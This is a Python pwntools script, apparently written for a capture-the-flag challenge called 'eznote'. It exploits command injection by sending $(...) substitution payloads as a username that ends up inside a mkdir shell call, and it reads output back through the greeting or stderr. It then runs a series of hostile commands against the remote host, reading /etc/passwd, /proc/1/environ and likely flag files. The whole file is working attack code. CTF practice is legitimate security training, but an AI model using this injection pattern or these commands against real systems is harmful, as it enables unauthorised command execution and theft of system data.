#!/usr/bin/env python3
"""
eznote command injection exploit via mkdir stderr.

The username is reflected into: mkdir -p '/prefix/USERNAME/'
If using double quotes (unpatched), command substitution works.

Key insight: mkdir errors go to STDERR, but we can redirect to stderr ourselves.
Also: The username appears in "Hello USERNAME, what do you want to do?"
"""
from pwn import *
import argparse
import re


def parse_args():
    p = argparse.ArgumentParser(description="eznote command injection via mkdir")
    p.add_argument("--host", required=True, help="Remote host")
    p.add_argument("--port", type=int, required=True, help="Remote port")
    p.add_argument("--cmd", help="Custom command to run")
    return p.parse_args()


def run_cmd_via_username(host, port, cmd, timeout=5):
    """
    Run command via username injection.
    Output appears in the "Hello USERNAME" greeting.
    """
    io = remote(host, port, timeout=timeout)
    
    io.recvuntil(b"Username:")
    payload = f"$({cmd})".encode()
    io.sendline(payload)
    
    # Get the greeting which contains our output
    data = io.recvuntil(b", what do you want to do?", timeout=timeout)
    io.close()
    
    # Extract what's between "Hello " and ", what"
    match = re.search(rb"Hello (.*), what", data, re.DOTALL)
    if match:
        return match.group(1)
    return b""


def run_cmd_via_mkdir(host, port, cmd, timeout=5):
    """
    Run command via mkdir stderr capture.
    Use option 2 (create note dir) which calls system(mkdir).
    """
    io = remote(host, port, timeout=timeout)
    
    io.recvuntil(b"Username:")
    # Payload that makes mkdir fail and outputs via error
    payload = f"$({cmd} >&2)x".encode()
    io.sendline(payload)
    
    io.recvuntil(b"> ")
    io.sendline(b"2")  # create note dir
    
    # Collect all output
    data = io.recvall(timeout=timeout)
    io.close()
    
    return data


def main():
    args = parse_args()
    host, port = args.host, args.port
    
    log.info("=" * 60)
    log.info("eznote Command Injection Exploit")
    log.info("=" * 60)
    
    if args.cmd:
        log.info(f"Running custom command: {args.cmd}")
        result = run_cmd_via_username(host, port, args.cmd)
        log.info(f"Username output: {result}")
        result2 = run_cmd_via_mkdir(host, port, args.cmd)
        log.info(f"Mkdir output: {result2}")
        return
    
    # Phase 1: Confirm command execution works
    log.info("\n[Phase 1] Confirming command execution...")
    
    test_cmds = [
        ("echo CMDTEST", b"CMDTEST"),
        ("whoami", None),
        ("id | cut -c1-20", None),
    ]
    
    cmd_works = False
    for cmd, expected in test_cmds:
        result = run_cmd_via_username(host, port, cmd)
        log.info(f"  {cmd}: {result}")
        if expected and expected in result:
            log.success("Command execution confirmed!")
            cmd_works = True
            break
        elif result and result != b"":
            log.success(f"Got output: {result}")
            cmd_works = True
            break
    
    if not cmd_works:
        log.warning("Command execution may not work or output is hidden")
    
    # Phase 2: Enumerate flag locations
    log.info("\n[Phase 2] Searching for flag file...")
    
    flag_cmds = [
        "cat /flag 2>/dev/null",
        "cat /flag.txt 2>/dev/null", 
        "cat /home/*/flag 2>/dev/null",
        "cat /home/ctf/flag 2>/dev/null",
        "cat /challenge/flag 2>/dev/null",
        "cat /root/flag 2>/dev/null",
        "cat /app/flag 2>/dev/null",
        "cat /var/flag 2>/dev/null",
        "find / -name 'flag*' -readable 2>/dev/null | head -3",
        "find / -name '*flag*' -type f 2>/dev/null | head -3",
        "ls -la / 2>/dev/null | grep -i flag",
        "ls -la /home 2>/dev/null",
        "env | grep -i flag",
        "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -i flag",
    ]
    
    for cmd in flag_cmds:
        result = run_cmd_via_username(host, port, cmd)
        if result:
            log.info(f"  {cmd[:40]}...: {result}")
            if b"flag{" in result.lower() or b"hkcert" in result.lower():
                log.success(f"FLAG FOUND: {result}")
                return
    
    # Phase 3: Try mkdir stderr for verbose output
    log.info("\n[Phase 3] Testing mkdir stderr capture...")
    
    stderr_cmds = [
        "cat /flag",
        "find / -name flag -exec cat {} \\;",
        "ls -la /",
        "cat /etc/passwd | head -3",
    ]
    
    for cmd in stderr_cmds:
        result = run_cmd_via_mkdir(host, port, cmd)
        log.info(f"  {cmd[:30]}...: {result[:200] if result else 'empty'}")
        if b"flag{" in result.lower() or b"hkcert" in result.lower():
            log.success(f"FLAG FOUND IN STDERR: {result}")
            return
    
    # Phase 4: Directory enumeration
    log.info("\n[Phase 4] Directory enumeration...")
    
    enum_cmds = [
        "ls -la /",
        "ls -la /home",
        "ls -la /challenge",
        "ls -la /app",
        "pwd",
        "cat /etc/passwd",
    ]
    
    for cmd in enum_cmds:
        result = run_cmd_via_username(host, port, cmd)
        if result:
            log.info(f"  {cmd}: {result}")
    
    log.warning("Flag not found. Try --cmd with custom commands.")


if __name__ == "__main__":
    main()

